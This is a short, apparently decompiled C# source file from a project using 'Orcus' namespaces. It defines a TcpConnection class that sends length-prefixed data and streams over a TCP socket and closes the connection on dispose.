using System;
using System.IO;
using System.Net.Sockets;
using Orcus.Plugins;
using Orcus.Shared.Data;

namespace Orcus.Commands.ConnectionInitializer;

public class TcpConnection : IDisposable, IConnection
{
	private readonly BinaryWriter _binaryWriter;

	private readonly NetworkStream _networkStream;

	private readonly TcpClient _tcpClient;

	public bool SupportsStream { get; } = true;


	public TcpConnection(TcpClient tcpClient)
	{
		_tcpClient = tcpClient;
		_networkStream = tcpClient.GetStream();
		_binaryWriter = new BinaryWriter(_networkStream);
	}

	public void Dispose()
	{
		_networkStream.Close();
		_tcpClient.Close();
	}

	public void SendData(byte[] buffer, int offset, int length)
	{
		_networkStream.Write(BitConverter.GetBytes(length), 0, 4);
		_networkStream.Write(buffer, offset, length);
	}

	public void SendStream(WriterCall writerCall)
	{
		_binaryWriter.Write(writerCall.get_Size());
		writerCall.WriteIntoStream((Stream)_networkStream);
	}
}
